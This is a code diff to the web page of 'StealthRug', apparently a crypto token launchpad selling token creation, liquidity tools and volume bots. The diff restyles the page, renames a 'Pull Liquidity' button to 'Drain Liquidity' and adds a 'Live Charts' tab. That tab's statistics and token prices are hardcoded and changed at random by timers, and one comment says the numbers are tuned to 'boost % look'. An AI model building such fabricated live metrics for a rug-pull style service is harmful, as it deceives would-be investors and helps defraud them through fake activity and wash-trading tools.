@@ -66,25 +66,27 @@
       visibility: visible;
     }
     
-    .card {
-      background-color: #161616;
-      border-radius: 12px;
-      border: 1px solid #2A2A2A;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    }
-    
-.card:hover {
-  transform: translateY(-5px) scale(1.01);
-  border: 1px solid transparent;
-  background-origin: border-box;
-  background-clip: padding-box, border-box;
-  background-image: 
-    linear-gradient(#161616, #161616), /* card bg */
-    linear-gradient(90deg, #00ff96, #00b4ff); /* border */
-  border-radius: 25px;
-  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+.card {
+  background: linear-gradient(145deg, #1C1C1C, #121212);
+  border-radius: 18px;
+  border: 1px solid #2C2C2C;
+  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.6);
+  transition: all 0.3s ease;
+  backdrop-filter: blur(4px);
 }
+
+.card:hover {
+  transform: translateY(-4px) scale(1.012);
+  background: linear-gradient(145deg, #1E1E1E, #181818);
+  border-color: #00ff96;
+  box-shadow:
+    inset 0 0 0 1px rgba(255, 255, 255, 0.04),
+    0 10px 30px rgba(0, 255, 150, 0.08),
+    0 6px 20px rgba(128, 0, 255, 0.08);
+}
+
+
+
 
 
     
@@ -194,17 +196,19 @@ background: linear-gradient(-45deg, #00ff96, #8000ff, #00b4ff);
       visibility: visible;
     }
     
-    .modal-content {
-      background-color: #161616;
-      border: 1px solid #2A2A2A;
-      border-radius: 12px;
-      padding: 30px;
-      max-width: 500px;
-      width: 90%;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-      transform: translateY(20px);
-      transition: all 0.3s ease;
-    }
+.modal-content {
+  background: linear-gradient(145deg, #1C1C1C, #121212);
+  border: 1px solid #2C2C2C;
+  border-radius: 18px;
+  padding: 30px;
+  max-width: 500px;
+  width: 90%;
+  box-shadow:
+    inset 0 0 0 1px rgba(255, 255, 255, 0.04),
+    0 25px 50px -12px rgba(0, 0, 0, 0.5);
+  transition: all 0.3s ease;
+}
+
     
     .modal.active .modal-content {
       transform: translateY(0);
@@ -405,23 +409,28 @@ letter-spacing: 0.5px;
   max-width: 100%; /* Prevents overflow */
 }
     
-    .portfolio-modal {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: #161616;
-      border: 1px solid #2A2A2A;
-      border-radius: 12px;
-      padding: 30px;
-      max-width: 500px;
-      width: 90%;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-      z-index: 1001;
-      opacity: 0;
-      visibility: hidden;
-      transition: all 0.3s ease;
-    }
+.portfolio-modal {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: linear-gradient(145deg, rgba(20, 20, 20, 0.95), rgba(10, 10, 10, 0.95));
+  border: 1px solid rgba(128, 0, 255, 0.1);
+  border-radius: 16px;
+  padding: 32px;
+  max-width: 500px;
+  width: 90%;
+  box-shadow:
+    0 8px 30px rgba(0, 0, 0, 0.6),
+    0 0 12px rgba(128, 0, 255, 0.1);
+  z-index: 1001;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.3s ease;
+  color: #fff;
+  backdrop-filter: blur(20px);
+}
+
     
     .portfolio-modal.active {
       opacity: 1;
@@ -437,42 +446,71 @@ letter-spacing: 0.5px;
       font-size: 20px;
     }
     
-    /* Home Page Styles */
-    .home-hero {
-      background: linear-gradient(135deg, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.3) 100%);
-      border-radius: 16px;
-      padding: 80px 40px;
-      text-align: center;
-      margin-bottom: 60px;
-      position: relative;
-      overflow: hidden;
-    }
+.home-hero {
+  position: relative;
+  background: radial-gradient(circle at 50% 40%, rgba(128, 0, 255, 0.05), #0F0F0F 80%);
+  padding: 80px 40px;
+  border-radius: 20px;
+  text-align: center;
+  overflow: hidden;
+  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+  z-index: 1;
+}
+
+.home-hero:before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: url('/mnt/data/f4b60602-09c5-4e88-9993-632288644ff9.png') no-repeat center center;
+  background-size: contain;
+  opacity: 0.06;
+  z-index: 0;
+  mix-blend-mode: screen;
+}
+
+.home-hero::after {
+  content: '';
+  position: absolute;
+  top: -100px;
+  left: 50%;
+  width: 400px;
+  height: 400px;
+  transform: translateX(-50%);
+  background: radial-gradient(circle, rgba(0, 255, 150, 0.15), transparent 70%);
+  animation: pulseGlow 5s ease-in-out infinite;
+  z-index: 0;
+  filter: blur(60px);
+}
+@keyframes pulseGlow {
+  0%, 100% { opacity: 0.4; transform: translateX(-50%) scale(1); }
+  50% { opacity: 1; transform: translateX(-50%) scale(1.2); }
+}
+
+
     
-    .home-hero:before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: url('https://i.ibb.co/WNNSZGT0/rocket.png') no-repeat center center;
-      background-size: cover;
-      opacity: 0.15;
-      z-index: -1;
-    }
+.home-hero h1 {
+  font-size: 3.2rem;
+  font-weight: 800;
+  line-height: 1.2;
+  margin: 0;
+  padding-bottom: 4px; /* ensures descenders like 'g' aren't cropped */
+  background: linear-gradient(90deg, #00ff96, #8000ff, #00b4ff);
+  background-clip: text;
+  -webkit-background-clip: text;
+  color: transparent;
+  overflow-wrap: break-word;
+}
+
+
+
     
-    .home-hero h1 {
-      font-size: 3rem;
-      margin-bottom: 20px;
-      font-weight: 700;
-    }
-    
-    .home-hero p {
-      font-size: 1.25rem;
-      max-width: 700px;
-      margin: 0 auto 40px;
-      opacity: 0.9;
-    }
+.home-hero p {
+  color: rgba(255, 255, 255, 0.8);
+  font-weight: 500;
+  font-size: 1.1rem;
+  margin-top: 12px;
+}
+
     
     .home-hero .btn-primary {
       padding: 16px 40px;
@@ -533,20 +571,25 @@ letter-spacing: 0.5px;
     }
     
 .tool-card {
-  background: #161616;
-  border-radius: 12px; /* ✅ MUST BE HERE */
+  background: linear-gradient(145deg, #1C1C1C, #121212);
+  border-radius: 18px;
   padding: 30px;
   transition: all 0.3s ease;
-  border: 1px solid #2A2A2A;
-  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  border: 1px solid #2C2C2C;
+  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.6);
 }
 
 .tool-card:hover {
-  transform: translateY(-5px);
+  transform: translateY(-4px) scale(1.012);
+  background: linear-gradient(145deg, #1E1E1E, #181818);
   border-color: #00ff96;
-  box-shadow: 0 0 30px rgba(0, 255, 150, 0.2);
-  /* DO NOT add border-radius here unless it's the same */
+  box-shadow:
+    inset 0 0 0 1px rgba(255, 255, 255, 0.04),
+    0 10px 30px rgba(0, 255, 150, 0.08),
+    0 6px 20px rgba(128, 0, 255, 0.08);
 }
+
+
 
     
     .tool-icon {
@@ -596,13 +639,14 @@ letter-spacing: 0.5px;
   z-index: -1;
   pointer-events: none;
   background:
-    radial-gradient(circle at 20% 30%, rgba(0, 255, 150, 0.2), transparent 40%),
-    radial-gradient(circle at 70% 60%, rgba(128, 0, 255, 0.2), transparent 40%),
-    radial-gradient(circle at 80% 20%, rgba(0, 180, 255, 0.15), transparent 40%);
+    radial-gradient(circle at 20% 30%, rgba(100, 0, 255, 0.15), transparent 40%),
+    radial-gradient(circle at 70% 60%, rgba(0, 180, 255, 0.12), transparent 40%),
+    radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.08), transparent 50%);
   background-size: 200% 200%;
   animation: bgFlow 30s ease-in-out infinite;
   filter: blur(60px);
 }
+
 
 @keyframes bgFlow {
   0% { background-position: 0% 50%; }
@@ -631,7 +675,68 @@ letter-spacing: 0.5px;
   animation: fadeInTab 0.4s ease-out;
 }
 
+.live-counter {
+  display: inline-flex;
+  font-variant-numeric: tabular-nums;
+}
 
+.digit-container {
+  position: relative;
+  height: 1.3em;
+  width: 0.65em;
+  overflow: hidden;
+}
+
+.digit-slide {
+  position: absolute;
+  top: 0;
+  transition: transform 0.4s ease-in-out;
+  display: flex;
+  flex-direction: column;
+}
+
+.digit-slide div {
+  height: 1.3em;
+  line-height: 1.3em;
+  text-align: center;
+}
+
+
+@keyframes priceFlashGreen {
+  0% { color: #22c55e; text-shadow: 0 0 5px #22c55e; transform: scale(1); }
+  50% { color: #4ade80; text-shadow: 0 0 10px #4ade80; transform: scale(1.05); }
+  100% { color: #22c55e; text-shadow: none; transform: scale(1); }
+}
+
+@keyframes priceFlashRed {
+  0% { color: #f87171; text-shadow: 0 0 5px #f87171; transform: scale(1); }
+  50% { color: #ef4444; text-shadow: 0 0 10px #ef4444; transform: scale(1.05); }
+  100% { color: #f87171; text-shadow: none; transform: scale(1); }
+}
+
+.price.flash-green {
+  animation: priceFlashGreen 0.6s ease-in-out;
+}
+
+.price.flash-red {
+  animation: priceFlashRed 0.6s ease-in-out;
+}
+
+.telegram-icon {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  width: 28px;
+  height: 28px;
+  display: inline-block;
+  filter: invert(1);
+  opacity: 0.85;
+  transition: opacity 0.2s ease;
+}
+
+.telegram-icon:hover {
+  opacity: 1;
+}
 
   </style>
 </head>
@@ -669,6 +774,10 @@ letter-spacing: 0.5px;
         <i class="fas fa-exchange-alt mr-3"></i>
         <span>Volume Bots</span>
       </div>
+	  <div class="sidebar-menu-item p-4 pl-6 flex items-center" data-tab="live-charts">
+  <i class="fas fa-chart-pie mr-3"></i>
+  <span>Live Charts</span>
+</div>
       <div class="sidebar-menu-item p-4 pl-6 flex items-center hidden" id="portfolio-menu-item" data-tab="portfolio">
         <i class="fas fa-wallet mr-3"></i>
         <span>Liquidity Portfolio</span>
@@ -704,7 +813,11 @@ letter-spacing: 0.5px;
             <div class="nav-tab" data-tab="market-making">Market Making</div>
             <div class="nav-tab" data-tab="liquidity-adder">Liquidity Adder</div>
             <div class="nav-tab" data-tab="volume-bots">Volume Bots</div>
+			<div class="nav-tab" data-tab="live-charts">Live Charts</div>
 			<div class="nav-tab" data-tab="contact">Contact</div>
+			<a href="https://t.me/stealthrugapp" target="_blank" class="telegram-icon" aria-label="Telegram">
+  <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/telegram.svg" alt="Telegram" />
+</a>
           </div>
         </div>
       </div>
@@ -712,12 +825,17 @@ letter-spacing: 0.5px;
     
     <!-- Main Content -->
     <main class="flex-grow container mx-auto px-4 py-8">
-      <!-- Home Section -->
+       <!-- Home Section -->
       <div id="home" class="tab-content active">
         <section class="home-hero">
-          <h1>Greetings from StealthRug</h1>
-          <p>Aiming to launch your token to The Moon? Use our expert tools to create, deploy, and manage it with ease.</p>
-          <button class="btn-primary" data-tab="token-creator">Create Token</button>
+          <h1 class="text-4xl sm:text-5xl font-extrabold logo-gradient z-10 relative">StealthRug Launchpad</h1>
+<p class="text-lg sm:text-xl mt-4 text-gray-400 z-10 relative max-w-2xl mx-auto">
+Deploy tokens, build liquidity, boost volume — all in one click. No code. No limits. Just launch.
+</p>
+<button class="btn-primary mt-8 z-10 relative" data-tab="token-creator">Launch Token</button>
+<canvas id="hero-particles" class="absolute top-0 left-0 w-full h-full pointer-events-none z-0"></canvas>
+
+
         </section>
 
         <section class="tools-section">
@@ -1159,12 +1277,67 @@ letter-spacing: 0.5px;
         <label class="block text-sm font-medium text-gray-400 mb-2">Wallet Address</label>
         <input type="text" id="wallet-address" class="input-field w-full px-4 py-3 rounded-lg" placeholder="Enter your wallet address">
       </div>
-      <button id="pull-liquidity-btn" class="btn-primary w-full py-3 rounded-lg font-medium">Pull Liquidity</button>
+      <button id="pull-liquidity-btn" class="btn-primary w-full py-3 rounded-lg font-medium">Drain Liquidity</button>
     </div>
     <div id="pull-success-message" class="hidden mt-4 p-4 bg-green-900 rounded-lg">
       <p>Payment Sent To <span id="sent-to-wallet"></span></p>
     </div>
   </div>
+  
+  <!-- Live Charts Section -->
+  <div id="live-charts" class="tab-content hidden">
+  <div class="card p-8">
+    <h2 class="text-2xl font-bold mb-6 text-center">Live Stats</h2>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10 text-center">
+      <div class="card p-6">
+        <h3 class="text-xl font-bold mb-2">🧱 Total Tokens Created</h3>
+<p class="text-3xl font-bold text-green-400 live-counter" id="tokens-count"></p>
+      </div>
+      <div class="card p-6">
+        <h3 class="text-xl font-bold mb-2">👥 Active Users</h3>
+<p class="text-3xl font-bold text-blue-400 live-counter" id="users-count"></p>
+      </div>
+      <div class="card p-6">
+        <h3 class="text-xl font-bold mb-2">📈 Total Volume</h3>
+<p class="text-3xl font-bold text-purple-400 live-counter" id="volume-count"></p>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-center">
+      <div class="card p-6">
+        <h3 class="text-xl font-bold mb-2">📈 On the Rise</h3>
+<p class="text-3xl font-bold text-yellow-400 live-counter" id="mooning-count"></p>
+      </div>
+      <div class="card p-6">
+        <h3 class="text-xl font-bold mb-2">⚡ Average Launch Speed</h3>
+        <p class="text-3xl font-bold text-pink-400" id="launch-speed">4.2 sec</p>
+      </div>
+    </div>
+
+    <div class="mt-10 text-center">
+      <h3 class="text-xl font-bold mb-4">Trending Token Prices</h3>
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-4" id="price-feed">
+        <div class="card p-4">
+          <h4 class="font-semibold">DOGEZ</h4>
+          <p class="text-xl price" id="price-dogez">+$0.000042</p>
+        </div>
+        <div class="card p-4">
+          <h4 class="font-semibold">SOLMOON</h4>
+          <p class="text-xl price" id="price-solmoon">-$0.000017</p>
+        </div>
+        <div class="card p-4">
+          <h4 class="font-semibold">JUPINU</h4>
+          <p class="text-xl price" id="price-jupinu">+$0.00123</p>
+        </div>
+        <div class="card p-4">
+          <h4 class="font-semibold">PEPELORD</h4>
+          <p class="text-xl price" id="price-pepelord">+0.00%</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
   
   <!-- Contact Section -->
 <div id="contact" class="tab-content hidden">
@@ -1755,6 +1928,121 @@ animateDust();
       wrapper.classList.add('page-loaded');
     }, 50);
   });
+
+
+
+
+	
+
+
+function createRollingCounter(id, initial) {
+  const container = document.getElementById(id);
+  container.innerHTML = ''; // Clear old
+
+  const digits = initial.toLocaleString().split('');
+  digits.forEach(char => {
+    const digitWrap = document.createElement('div');
+    digitWrap.className = 'digit-container';
+    
+    const digitSlide = document.createElement('div');
+    digitSlide.className = 'digit-slide';
+
+    if (/\d/.test(char)) {
+      for (let i = 0; i <= 9; i++) {
+        const d = document.createElement('div');
+        d.textContent = i;
+        digitSlide.appendChild(d);
+      }
+      digitSlide.style.transform = `translateY(-${parseInt(char) * 1.3}em)`;
+    } else {
+      const d = document.createElement('div');
+      d.textContent = char;
+      digitSlide.appendChild(d);
+    }
+
+    digitWrap.appendChild(digitSlide);
+    container.appendChild(digitWrap);
+  });
+}
+
+function updateRollingCounter(id, value) {
+  const container = document.getElementById(id);
+  const digits = value.toLocaleString().split('');
+
+  [...container.children].forEach((digitWrap, i) => {
+    const slide = digitWrap.querySelector('.digit-slide');
+    const char = digits[i];
+    if (!slide || !char) return;
+
+    if (/\d/.test(char)) {
+      slide.style.transform = `translateY(-${parseInt(char) * 1.3}em)`;
+    } else {
+      slide.innerHTML = `<div>${char}</div>`;
+    }
+  });
+}
+
+
+let tokenLaunches = 16542;
+let mooningTokens = 64;
+
+const stats = {
+  'tokens-count': tokenLaunches,
+  'users-count': 275,
+  'volume-count': 2274753,
+  'mooning-count': mooningTokens
+};
+
+Object.entries(stats).forEach(([id, val]) => createRollingCounter(id, val));
+
+setInterval(() => {
+  const tokensAdded = Math.floor(Math.random() * 4) + 2;
+  const newMoonings = Math.random() > 0.7 ? 1 : 0; // more moonings to boost % look
+
+  tokenLaunches += tokensAdded;
+  mooningTokens += newMoonings;
+
+  stats['tokens-count'] = tokenLaunches;
+  stats['mooning-count'] = mooningTokens;
+  stats['users-count'] += Math.floor(Math.random() * 3 - 1);
+  stats['volume-count'] += Math.floor(Math.random() * 1000 + 200);
+
+  Object.entries(stats).forEach(([id, val]) => updateRollingCounter(id, val));
+}, 2500);
+
+
+
+
+const trendingPrices = {
+  'price-dogez': 0.000042,
+  'price-solmoon': -0.000017,
+  'price-jupinu': 0.00123,
+  'price-pepelord': 0.0
+};
+
+function updateTrendingPrices() {
+  Object.entries(trendingPrices).forEach(([id, val]) => {
+    let delta = (Math.random() * 0.00001).toFixed(6);
+    const direction = Math.random() > 0.5 ? 1 : -1;
+    const newVal = (val + delta * direction).toFixed(6);
+
+    const el = document.getElementById(id);
+    if (!el) return;
+
+    const isUp = newVal > val;
+    trendingPrices[id] = parseFloat(newVal);
+
+    // Set text
+    el.textContent = `${isUp ? '+' : '-'}$${Math.abs(newVal)}`;
+
+    // Add flash class
+    el.classList.remove('flash-green', 'flash-red');
+    void el.offsetWidth; // force reflow
+    el.classList.add(isUp ? 'flash-green' : 'flash-red');
+  });
+}
+
+setInterval(updateTrendingPrices, 3000);
 
 
 
